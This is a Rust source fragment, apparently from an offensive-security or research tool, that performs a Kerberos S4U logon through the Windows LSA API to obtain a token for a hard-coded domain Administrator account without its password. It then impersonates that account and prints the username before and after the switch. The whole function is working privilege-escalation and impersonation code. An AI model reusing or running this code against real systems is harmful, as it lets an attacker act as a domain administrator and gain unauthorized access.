pub fn getkerbs4ulogontcbprivilege(){
    unsafe{


        let upn = "Administrator@tech69.local".to_string();
        let realm = "tech69.local".to_string();
        
        let mut mys4u = createkerbs4ulogon(upn, realm);
        //println!("{:x?}",mys4u);
        //println!("{}",std::mem::size_of_val(&kerbs4u.ClientUpn.Buffer));
        //println!("clientupn buffer: {:x?}",kerbs4u.ClientUpn.Buffer);


       

            let mut lsastring = unsafe{std::mem::zeroed::<LSA_STRING>()};
            let mut buffer = "User32LogonProcess".bytes().collect::<Vec<u8>>();
            lsastring.Length = buffer.len() as u16;
            lsastring.MaximumLength = buffer.len() as u16 ;
            lsastring.Buffer = buffer.as_mut_ptr() as *mut i8;
            
            let mut lsahandle = 0 as *mut c_void;
            let mut securitymode = 0;
            let ntstatus = LsaRegisterLogonProcess(&mut lsastring, &mut lsahandle, &mut securitymode);
            if ntstatus!=STATUS_SUCCESS{
                println!("LsaRegisterLogonProcess failed: {:x?}",ntstatus);
                return ();
            }





        let mut kerberosstring = unsafe{std::mem::zeroed::<LSA_STRING>()};
        let mut buffer2 = "Kerberos".bytes().collect::<Vec<u8>>();
        kerberosstring.Length = buffer2.len() as u16;
        kerberosstring.MaximumLength = buffer2.len() as u16 ;
        kerberosstring.Buffer = buffer2.as_mut_ptr() as *mut i8;

        
        let mut packagehandle = 0;
        let ntstatus = LsaLookupAuthenticationPackage(lsahandle, 
             &mut kerberosstring, &mut packagehandle);
       
        if ntstatus!=STATUS_SUCCESS{
            LsaDeregisterLogonProcess(lsahandle);
            //return Err(format!("LsaLookupAuthenticationPackage failed: {:x?}",ntstatus));
            println!("LsaLookupAuthenticationPackage failed: {:x?}",ntstatus);
            return ();
        }


        /*let mut bytesneeded = 0;
        GetTokenInformation(tokenhandle, 
            7, std::ptr::null_mut(), 0, &mut bytesneeded);
        
        let mut tokensource = vec![0u8;bytesneeded as usize];
        let res = GetTokenInformation(tokenhandle, 
            7, tokensource.as_mut_ptr() as *mut c_void, bytesneeded, &mut bytesneeded);
        if res==0{
            println!("gettokeninfo failed: {}",GetLastError());
        }*/
        
       let mut token_source = std::mem::zeroed::<TOKEN_SOURCE>();
        token_source.SourceName= (*b"User32\0\0").map(|u| u as i8);

        token_source.SourceIdentifier = std::mem::zeroed::<LUID>();

            let mut origin = unsafe{std::mem::zeroed::<LSA_STRING>()};
        let mut buffer5 = "Testing".bytes().collect::<Vec<u8>>();
        origin.Length = buffer5.len() as u16;
        origin.MaximumLength = buffer5.len() as u16 ;
        origin.Buffer = buffer5.as_mut_ptr() as *mut i8;



            let mut profile = 0 as *mut c_void;
            let mut profilelength = 0;
            let mut luid = std::mem::zeroed::<LUID>();
            let mut newtokenhandle = 0 as *mut c_void;
            let mut quotalimits = std::mem::zeroed::<QUOTA_LIMITS>();
            let mut logonrejectstatus = 0;
            let ntstatus = LsaLogonUser(lsahandle, 
                &mut origin, 
                Network, 
                 packagehandle, 
                mys4u.as_mut_ptr() as *mut c_void, 
                mys4u.len() as u32, 
                std::ptr::null_mut(), 
              &mut token_source as *mut _ as *mut TOKEN_SOURCE  , 
              &mut profile, 
              &mut profilelength, 
              &mut luid, 
              &mut newtokenhandle, 
              &mut quotalimits, 
            &mut logonrejectstatus);

            println!("logon reject status: {}",logonrejectstatus);
            if ntstatus!=STATUS_SUCCESS{
                println!("LsaLogonUser failed: {:x?}",ntstatus);
                LsaDeregisterLogonProcess(lsahandle);
                return ();
            }

            println!("tokenhandle: {:x?}",newtokenhandle);

            tokens::gettokenstatistics(newtokenhandle);
            let user = tokens::gettokenuserinfo(newtokenhandle);
            if user.is_ok(){
                println!("user: {}",user.unwrap());

            }
            let mut reqsize = 0;
            GetUserNameA(std::ptr::null_mut(), &mut reqsize);

            let mut username1 = vec![0u8;reqsize as usize];
            GetUserNameA(username1.as_mut_ptr() as *mut i8, &mut reqsize);

            println!("username before impersonation: {}",String::from_utf8_lossy(&username1));

            

            ImpersonateLoggedOnUser(newtokenhandle);

            let mut reqsize = 0;
            GetUserNameA(std::ptr::null_mut(), &mut reqsize);

            let mut username1 = vec![0u8;reqsize as usize];
            GetUserNameA(username1.as_mut_ptr() as *mut i8, &mut reqsize);

            println!("username: {}",String::from_utf8_lossy(&username1));

            RevertToSelf();


            

            CloseHandle(newtokenhandle);
            LsaDeregisterLogonProcess(lsahandle);

        

    }
}

